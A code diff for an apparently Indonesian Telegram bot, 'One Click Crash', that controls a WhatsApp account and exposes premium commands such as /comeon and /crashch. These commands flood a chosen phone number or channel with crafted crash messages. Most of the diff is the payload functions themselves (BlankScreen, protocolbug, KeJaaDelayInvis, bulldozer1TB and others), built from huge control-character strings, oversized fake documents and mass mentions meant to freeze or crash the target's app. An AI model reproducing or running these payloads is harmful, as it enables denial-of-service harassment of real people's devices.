@@ -15,7 +15,7 @@ const pino = require("pino");
 const chalk = require("chalk");
 const axios = require("axios");
 const config = require("./config.js");
-
+const { BOT_TOKEN, OWNER_ID, GITHUB_TOKEN_LIST_URL } = require("./config");
 const crypto = require("crypto");
 
 // File paths for user data
@@ -42,7 +42,7 @@ const getUptime = () => {
   const uptimeSeconds = process.uptime();
   const hours = Math.floor(uptimeSeconds / 3600);
   const minutes = Math.floor((uptimeSeconds % 3600) / 60);
-  const seconds = Math.floor(uptimeSeconds % 60);
+  const seconds = Math.floor((uptimeSeconds % 60)); 
   return `${hours}h ${minutes}m ${seconds}s`;
 };
 
@@ -59,11 +59,16 @@ function ensureDatabaseFolder() {
 
 function loadJSON(file) {
   if (!fs.existsSync(file)) {
-      // Create empty file if it doesn't exist
       fs.writeFileSync(file, '[]', 'utf8');
       return [];
   }
-  return JSON.parse(fs.readFileSync(file, "utf8"));
+  try { 
+      return JSON.parse(fs.readFileSync(file, "utf8"));
+  } catch (e) {
+      console.error(chalk.red(`Error parsing JSON file ${file}:`), e);
+      fs.writeFileSync(file, '[]', 'utf8'); // Reset to empty array on error
+      return [];
+  }
 }
 
 function saveJSON(file, data) {
@@ -130,7 +135,6 @@ function isOwner(userId) {
 
 // Token Validation Function (now called from server.js)
 
-
 ///// --- WhatsApp Connection --- \\\\\
 const startSesi = async () => {
   const { state, saveCreds } = await useMultiFileAuthState("./session");
@@ -155,11 +159,11 @@ const startSesi = async () => {
     const { connection, lastDisconnect, qr } = update;
 
     if (qr) {
-        if (io) { // Only emit if Socket.IO is initialized
+        if (io) { 
             io.emit('whatsapp-qr', { qrCode: qr });
             console.log(chalk.yellow('QR code received. Transmitting to web dashboard.'));
         } else {
-            console.log(chalk.yellow('QR Code:', qr)); // Fallback for terminal
+            console.log(chalk.yellow('QR Code:', qr)); 
         }
     }
 
@@ -259,7 +263,7 @@ bot.start(async (ctx) => {
 Hᴇʟʟᴏ Wᴏʀʟᴅ
 Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ
  
-Sᴇʙᴇʟᴜᴍ Mᴇɴɢɢᴜɴᴀᴋᴀɴ Bᴏᴛ SɪʟᴀʜKᴀɴ /addprem TᴇʀLᴇʙɪʜ DᴀHulu\`\`\``,
+Sᴇʙᴇʟᴜᴍ MᴇNggunaKᴀɴ Bᴏᴛ SɪlᴀHkan /addprem TᴇrLᴇʙɪʜ DᴀHulu\`\`\``,
       parse_mode: "Markdown",
       reply_markup: fallbackKeyboard,
     });
@@ -387,7 +391,10 @@ I am a bot created by kepFoЯannas and to help and eradicate fraudsters. not int
   const mainKeyboard = [
     [{ text: "Oᴡɴᴇʀ Mᴇɴᴜ", callback_data: "owner_menu" }, { text: "Bᴜɢ Mᴇɴᴜ", callback_data: "bug_menu" }],
     [{ text: "Tʜᴀɴᴋs Fᴏʀ Sᴜᴘᴘᴏʀᴛ", callback_data: "thanks" }],
-    [{ text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 1", url: "https://t.me/Alpooooooofoluv" }, { text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 2", url: "https://t.me/MyyHostt" }]
+    [
+      { text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 1", url: "https://t.me/Alpooooooofoluv" },
+      { text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 2", url: "https://t.me/MyyHostt" }
+    ]
   ];
   try { await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } }); } catch (err) { await ctx.replyWithPhoto(media.media, { caption: media.caption, parse_mode: media.parse_mode, reply_markup: { inline_keyboard: mainKeyboard } }); }
 });
@@ -412,7 +419,7 @@ async function sendBugWithProgress(target, bugFunction, commandName, ioInstance,
         }
 
         try {
-            await bugFunction(target); // Execute the bug sending logic
+            await bugFunction(target); 
             currentIteration++;
             
             if (ioInstance) {
@@ -425,8 +432,8 @@ async function sendBugWithProgress(target, bugFunction, commandName, ioInstance,
                 });
             }
 
-            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between sends
-            sendLoop(); // Continue the loop recursively
+            await new Promise(resolve => setTimeout(resolve, 1000)); 
+            sendLoop(); 
         } catch (error) {
             console.error(chalk.red(`[Bug Sender] Error saat mengirim ${commandName} ke ${target} pada iterasi ${currentIteration + 1}: ${error.message}`));
             if (ioInstance) {
@@ -437,8 +444,8 @@ async function sendBugWithProgress(target, bugFunction, commandName, ioInstance,
                     message: `Gagal mengirim ${commandName} ke ${target} pada iterasi ${currentIteration + 1}: ${error.message}`
                 });
             }
-            currentIteration++; // Increment even on error to prevent infinite loop on persistent errors
-            sendLoop(); // Continue the loop
+            currentIteration++; 
+            sendLoop(); 
         }
     };
     sendLoop();
@@ -449,10 +456,10 @@ bot.command("comeon", checkWhatsAppConnection, checkPremium, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   const chatId = ctx.chat.id;
 
-  if (!q) { return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /comeon 62×××`); }
+  if (!q) { return ctx.reply(`Cᴏɴᴛᴏʜ PᴇɴɢɢᴜɴᴀᴀN : /comeon 62×××`); }
   if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
     const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
-    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
+    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} DᴇᴛɪK Lᴀɢɪ`);
   }
   let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
@@ -480,42 +487,40 @@ bot.command("comeon", checkWhatsAppConnection, checkPremium, async (ctx) => {
 
   if (!isOwner(ctx.from.id)) { setGlobalCooldown(); }
 
-  // Use the sendBugWithProgress helper for consistency
   sendBugWithProgress(target, async (t) => {
       await invisslow(22, t); await sleep(1500); await invismed(22, t); await sleep(1500);
       await invisdur(22, t); await sleep(1500); await noinv(22, t); await sleep(1500);
-  }, 'comeon', io, 'One Click Crash Sending Bug'); // Pass io instance
+  }, 'comeon', io, 'One Click Crash Sending Bug'); 
 });
 
-// Other bug commands (/getout, /loving, /shibal, /exsecute) - streamlined for brevity
 bot.command("getout", checkWhatsAppConnection, checkPremium, async (ctx) => {
-    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /getout 62×××`);
-    // ... (progress bar code - omitted for brevity, assume similar to /comeon) ...
+    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ PᴇɴɢɢᴜɴᴀᴀN : /getout 62×××`);
     let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    // ... (progress bar code - omitted for brevity, assume similar to /comeon) ...
     sendBugWithProgress(target, async (t) => {
         await invisdur(22, t); await sleep(1500); await invismed(22, t); await sleep(1500); await invisslow(22, t); await sleep(1500);
     }, 'getout', io, 'One Click Crash Sending Bug');
 });
 bot.command("loving", checkWhatsAppConnection, checkPremium, async (ctx) => {
-    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /loving 62×××`);
-    // ... (progress bar code - omitted for brevity) ...
+    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ PᴇɴɢɢᴜɴᴀᴀN : /loving 62×××`);
     let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    // ... (progress bar code - omitted for brevity) ...
     sendBugWithProgress(target, async (t) => {
         await invisdur(22, t); await sleep(1500); await invismed(22, t); await sleep(1500); await invisslow(22, t); await sleep(1500);
     }, 'loving', io, 'One Click Crash Sending Bug');
 });
 bot.command("shibal", checkWhatsAppConnection, checkPremium, async (ctx) => {
-    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /shibal 62×××`);
-    // ... (progress bar code - omitted for brevity) ...
+    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ PᴇɴɢɢᴜɴᴀᴀN : /shibal 62×××`);
     let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    // ... (progress bar code - omitted for brevity) ...
     sendBugWithProgress(target, async (t) => {
         await invisdur(22, t); await sleep(1500); await invismed(22, t); await sleep(1500); await invisslow(22, t); await sleep(1500);
     }, 'shibal', io, 'One Click Crash Sending Bug');
 });
 bot.command("exsecute", checkWhatsAppConnection, checkPremium, async (ctx) => {
-    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /exsecute 62×××`);
-    // ... (progress bar code - omitted for brevity) ...
+    const q = ctx.message.text.split(" ")[1]; const chatId = ctx.chat.id; if (!q) return ctx.reply(`Cᴏɴᴛᴏʜ PᴇɴɢɢᴜɴᴀᴀN : /exsecute 62×××`);
     let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    // ... (progress bar code - omitted for brevity) ...
     sendBugWithProgress(target, async (t) => {
         await invisslow(22, t); await sleep(1500); await invismed(22, t); await sleep(1500); await invisdur(22, t); await sleep(1500);
     }, 'exsecute', io, 'One Click Crash Sending Bug');
@@ -525,19 +530,14 @@ bot.command("crashch", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const q = ctx.message.text.split(" ")[1];
     if (!q) { return ctx.reply(`Example:\n\n/crashch 1234567891011@newsletter`); }
     let SockNumber = q.replace(/[^0-9]/g, '');
-    let target = SockNumber + "@s.whatsapp.net"; // This should be @newsletter for channels
-    if (!target.endsWith('@newsletter')) target = SockNumber + '@newsletter'; // Ensure it's a newsletter JID
+    let target = SockNumber + "@newsletter"; 
 
     let ProsesSock = await ctx.reply(`Successfully✅`);
 
-    // Use sendBugWithProgress for crashch, with 200 iterations
     sendBugWithProgress(target, async (t) => {
         await ch(t);
-    }, 'crashch', io, 'One Click Crash Sending Bug', 200); // 200 iterations for crashch
+    }, 'crashch', io, 'One Click Crash Sending Bug', 200); 
 
-    // The editMessageText will be done after the bug sending loop is finished or progress is updated via socket.
-    // For telegram, you might want to wait for the completion from sendBugWithProgress
-    // or just acknowledge immediately. Keeping the existing acknowledgement for now.
     await ctx.telegram.editMessageText(ctx.chat.id, ProsesSock.message_id, undefined, `
 ┏━━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━━┓
 ┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜
@@ -620,8 +620,8 @@ bot.command("addpairing", checkOwner, async (ctx) => {
   let sentMessage;
   try {
     sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
-      caption: `
-\`\`\`Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ
+      caption: `\`\`\`
+Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ
 ▢ Menyiapkan kode pairing...
 ╰➤ Nomor : ${phoneNumber}
 \`\`\``,
@@ -674,8 +674,7 @@ bot.command("restart", checkOwner, async (ctx) => {
 // atau untuk memperbaiki variabel yang tidak dikenal (seperti `m` di `blanks`).
 // Pastikan semua URL aset (gambar, video, dll.) yang digunakan di sini masih valid dan publik.
 
-async function noinv(count, target) { // count as the iteration for the bug type.
-  // Original `noinv` used `durationHours`. I will adapt it to `count` directly.
+async function noinv(count, target) { 
   for (let i = 0; i < count; i++) {
     await Promise.all([
         XdelayVoltexC(target), VampNewAttack(target, true), VampDelayCrash(Mikasa, target),
@@ -684,7 +683,7 @@ async function noinv(count, target) { // count as the iteration for the bug type
         kamuflaseFreeze(Mikasa, target), systemUi(Mikasa, target), crashMsgCall(Mikasa, target),
         blanks(target), AxnForceClose(target), BlankNotific(target),
     ]);
-    await sleep(100); // Small delay between sets of messages if needed
+    await sleep(100); 
   }
 }
 
@@ -700,7 +699,7 @@ async function invismed(count, target) {
     await Promise.all([
         protocolbug(Mikasa, target, false), protocolbug3(Mikasa, target, false),
         xatanicaldelay(Mikasa, target, false), bulldozer1TB(Mikasa, target),
-        KeJaaDelayInvis(target, false, 2) // durationHours of 2 for KeJaaDelayInvis
+        KeJaaDelayInvis(target, false, 2) 
     ]);
     await sleep(100);
   }
@@ -721,9 +720,7 @@ async function ch(target) {
   }
 }
 
-// All other original bug helper functions (place them exactly as they were in your previous index.js)
-// I'll omit their full content here for readability, but assume they are present.
-async function crashMsgCall(Mikasa, target) { /* ... Your full code ... */
+async function crashMsgCall(Mikasa, target) {
     Mikasa.relayMessage(target, {
     viewOnceMessage: {
         message: {
@@ -789,7 +786,7 @@ async function crashMsgCall(Mikasa, target) { /* ... Your full code ... */
 }, { participant: { jid: target } }, { messageId: null });
 }
 
-async function kamuflaseFreeze(Mikasa, target) { /* ... Your full code ... */
+async function kamuflaseFreeze(Mikasa, target) {
     let messagePayload = {
         ephemeralMessage: {
             message: {
@@ -873,7 +870,7 @@ async function kamuflaseFreeze(Mikasa, target) { /* ... Your full code ... */
     Mikasa.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
 }
 
-async function systemUi(Mikasa, target) { /* ... Your full code ... */
+async function systemUi(Mikasa, target) {
     Mikasa.relayMessage(target, {
         ephemeralMessage: {
             message: {
@@ -899,7 +896,7 @@ async function systemUi(Mikasa, target) { /* ... Your full code ... */
     }, { participant: { jid: target } }, { messageId: null });
 }
 
-async function program(Mikasa, target) { /* ... Your full code ... */
+async function program(Mikasa, target) {
     Mikasa.relayMessage(target, {
   "eventMessage": {
     "isCanceled": false,
@@ -917,7 +914,7 @@ async function program(Mikasa, target) { /* ... Your full code ... */
     );
 }
 
-async function freezeInDocument(Mikasa, target) { /* ... Your full code ... */
+async function freezeInDocument(Mikasa, target) {
     Mikasa.relayMessage(
         target,
         {
@@ -974,7 +971,7 @@ async function freezeInDocument(Mikasa, target) { /* ... Your full code ... */
     );
 }
 
-async function LocationUi(Mikasa, target) { /* ... Your full code ... */
+async function LocationUi(Mikasa, target) {
                    await Mikasa.relayMessage(target, {
                            groupMentionedMessage: {
                                    message: {
@@ -1015,7 +1012,7 @@ async function LocationUi(Mikasa, target) { /* ... Your full code ... */
                            }
                    });
            }
-           async function DocumentUi(Mikasa, target) { /* ... Your full code ... */
+           async function DocumentUi(Mikasa, target) {
                    await Mikasa.relayMessage(target, {
                            groupMentionedMessage: {
                                    message: {
@@ -1066,7 +1063,7 @@ async function LocationUi(Mikasa, target) { /* ... Your full code ... */
            }
            
 
-async function BlankNotific(target) { /* ... Your full code ... */
+async function BlankNotific(target) {
    await Mikasa.relayMessage(target, {
      ephemeralMessage: {
       message: {
@@ -1133,7 +1130,7 @@ async function BlankNotific(target) { /* ... Your full code ... */
    );
   }
 
-async function AxnForceClose(target) { /* ... Your full code ... */
+async function AxnForceClose(target) {
   let msg = await generateWAMessageFromContent(
     target,
     {
@@ -1174,7 +1171,6 @@ async function AxnForceClose(target) { /* ... Your full code ... */
 }
 
 async function blanks(target) {
-    // Corrected `m` to an empty object or a valid quoted message object
     await Mikasa.relayMessage(
         target,
         {
@@ -1186,17 +1182,17 @@ async function blanks(target) {
                 {
                     buttonId: "X",
                     buttonText: {
-                        displayText: "One Click Crash" + "\u0003".repeat(9999) // Reduced repeat count for stability
+                        displayText: "One Click Crash" + "\u0003".repeat(9999) 
                     },
                     type: 1,
                 },
             ],
             headerType: 1,
         },
-        { quoted: {} } // `m` was undefined, replaced with an empty object
+        { quoted: {} } 
     );
 }
-async function crashNewsletter(target) { /* ... Your full code ... */
+async function crashNewsletter(target) {
   const msg = generateWAMessageFromContent(target, {
     interactiveMessage: {
       header: {
@@ -1241,7 +1237,7 @@ async function crashNewsletter(target) { /* ... Your full code ... */
 }
 
 const VampireKING = { key: { remoteJid: "p", fromMe: false, participant: "0@s.whatsapp.net", }, message: { interactiveResponseMessage: { body: { text: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ × Mɪᴋᴀsᴀ Cʟᴏᴜᴅ", format: "DEFAULT", }, nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"shibalDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Vampire&devorsixcore@shibal.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u200e".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`, version: 3, }, }, }, };
-async function BlankScreen(target, Ptcp = false) { /* ... Your full code ... */
+async function BlankScreen(target, Ptcp = false) {
         let virtex = "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ × Mɪᴋᴀsᴀ Cʟᴏᴜᴅ" + "\u0003".repeat(90000);
 			await Mikasa.relayMessage(target, {
 					ephemeralMessage: {
@@ -1283,7 +1279,7 @@ async function BlankScreen(target, Ptcp = false) { /* ... Your full code ... */
 											fileLength: "9999999999999",
 											pageCount: 1316134911,
 											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-											fileName: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ × Mɪᴋᴀsᴀ Cʟᴏᴜᴅ",
+											fileName: "\u0003",
 											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
 											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
 											mediaKeyTimestamp: "1724474503",
@@ -1291,7 +1287,7 @@ async function BlankScreen(target, Ptcp = false) { /* ... Your full code ... */
 											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
 											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
 											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-											jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIAAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z',
+											jpegThumbnail: "",
 										},
 									},
 								},
@@ -1307,7 +1303,7 @@ async function BlankScreen(target, Ptcp = false) { /* ... Your full code ... */
 			);
        }
        
-async function VampDelayCrash(Mikasa, target) { /* ... Your full code ... */
+async function VampDelayCrash(Mikasa, target) {
     const Vampire = "_*~@15056662003~*_\n".repeat(10200);
     const Lalapo = "ꦽ".repeat(1500);
 
@@ -1370,7 +1366,7 @@ async function VampDelayCrash(Mikasa, target) { /* ... Your full code ... */
     await Mikasa.relayMessage(target, message, { participant: { jid: target } });
 }
 
-async function VampNewAttack(target, Ptcp = false) { /* ... Your full code ... */
+async function VampNewAttack(target, Ptcp = false) {
             let msg = await generateWAMessageFromContent(target, {
                 viewOnceMessage: {
                     message: {
@@ -1405,7 +1401,7 @@ async function VampNewAttack(target, Ptcp = false) { /* ... Your full code ... *
 			} : {});
         }
 
-async function KeJaaDelayInvis(target, mention = false, durationHours = 2) { /* ... Your full code ... */
+async function KeJaaDelayInvis(target, mention = false, durationHours = 2) {
   const duration = durationHours * 60 * 60 * 1000;
   const startTime = Date.now();
   let count = 0;
@@ -1507,8 +1503,8 @@ async function KeJaaDelayInvis(target, mention = false, durationHours = 2) { /* 
               {
                 tag: "chaos_tracker",
                 attrs: { 
-                  effect: "super_lag",
-                  duration: "eternal" 
+                  intensity: "MAX",
+                  target: "DEVICE" 
                 },
                 content: generateChaosString(5000),
               },
@@ -1534,7 +1530,7 @@ async function KeJaaDelayInvis(target, mention = false, durationHours = 2) { /* 
     }));
 
     const mentionedJids = Array.from({ length: mentionCount * 2 }, () => 
-      `1${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`
+      `1${Math.floor(Math.random() * 9999999999) + 1}@s.whatsapp.net`
     );
 
     const content = {
@@ -1652,7 +1648,7 @@ async function KeJaaDelayInvis(target, mention = false, durationHours = 2) { /* 
   chaosLoop();
 }
 
-async function bulldozer1TB(Mikasa, target) { /* ... Your full code ... */
+async function bulldozer1TB(Mikasa, target) {
   const SID = "5e03e0&mms3";
   const key = "10000000_2012297619515179_5714769099548640934_n.enc";
   const type = "image/webp";
@@ -1705,7 +1701,7 @@ async function bulldozer1TB(Mikasa, target) { /* ... Your full code ... */
   }
 }
 
-async function Delaytravadex(target) { /* ... Your full code ... */
+async function Delaytravadex(target) {
             for (let i = 0; i < 20; i++) {
         await Mikasa.relayMessage(target, 
             {
@@ -1730,7 +1726,7 @@ async function Delaytravadex(target) { /* ... Your full code ... */
     }
 }
 
-async function XdelayVoltexC(target) { /* ... Your full code ... */
+async function XdelayVoltexC(target) {
     if (typeof target !== "string" || (!target.includes("@s.whatsapp.net") && !target.includes("@newsletter"))) {
         console.warn("❌ Target tidak valid:", target);
         return;
@@ -1854,7 +1850,7 @@ async function XdelayVoltexC(target) { /* ... Your full code ... */
     });
 }
 
-async function location(target) { /* ... Your full code ... */
+async function location(target) {
     const generateMessage = {
         viewOnceMessage: {
             message: {
@@ -1902,7 +1898,7 @@ await Mikasa.relayMessage("status@broadcast", msg.message, {
 });
 }
 
-async function protocolbug(Mikasa, target, mention) { /* ... Your full code ... */
+async function protocolbug(Mikasa, target, mention) {
 const delaymention = Array.from({ length: 9741 }, (_, r) => ({
 title: "᭯".repeat(9741),
 rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
@@ -1991,7 +1987,7 @@ content: undefined
 }
 }   
 
-async function protocolbug3(Mikasa, target, mention) { /* ... Your full code ... */
+async function protocolbug3(Mikasa, target, mention) {
     const msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
@@ -2075,7 +2071,7 @@ async function protocolbug3(Mikasa, target, mention) { /* ... Your full code ...
     }
 }
 
-async function xatanicaldelay(Mikasa, target, mention) { /* ... Your full code ... */
+async function xatanicaldelay(Mikasa, target, mention) {
     const generateMessage = {
         viewOnceMessage: {
             message: {
@@ -2159,7 +2155,7 @@ async function xatanicaldelay(Mikasa, target, mention) { /* ... Your full code .
     }
 }
 
-async function shibalProtocol(target, mention) { /* ... Your full code ... */
+async function shibalProtocol(target, mention) {
                 const sex = Array.from({ length: 9741 }, (_, r) => ({
                        title: "꧀".repeat(9741),
                            rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
@@ -2248,12 +2244,12 @@ async function shibalProtocol(target, mention) { /* ... Your full code ... */
 }
 };
 
-async function xatanicaldelayv2(target, mention) { /* ... Your full code ... */
+async function xatanicaldelayv2(target, mention) {
   let message = {
     viewOnceMessage: {
       message: {
         stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
           fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
           fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
           mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
@@ -2320,8 +2316,6 @@ async function xatanicaldelayv2(target, mention) { /* ... Your full code ... */
             ],
           },
         ],
-      },
-    ],
   });
 }
 
